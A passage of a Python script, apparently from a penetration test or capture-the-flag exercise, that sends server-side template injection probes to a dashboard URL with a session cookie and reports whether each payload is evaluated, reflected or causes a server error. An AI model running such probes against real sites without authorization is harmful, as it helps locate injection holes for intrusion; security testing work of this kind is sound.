    url = f"{base_url}/dashboard?test={requests.utils.quote(payload)}"
    resp = requests.get(url, headers=headers, cookies={"session": session_cookie}, allow_redirects=False)
    
    # Check if payload is evaluated (SSTI) or just reflected
    if '49' in resp.text and '7' not in resp.text.replace('49', 'X').replace('http', ''):
        print(f"  [!] SSTI CONFIRMED: '{payload}' -> 49 found in response")
    elif '{{' not in resp.text and payload in resp.text.replace('{{', '').replace('}}', ''):
        print(f"  [+] Payload reflected: '{payload}'")
    elif resp.status_code == 500:
        print(f"  [!] 500 Error with: '{payload}'")
    else:
        print(f"  [-] '{payload[:30]}...' -> Status {resp.status_code}")

# The SSTI might work differently - let's try the same payloads against the login forms
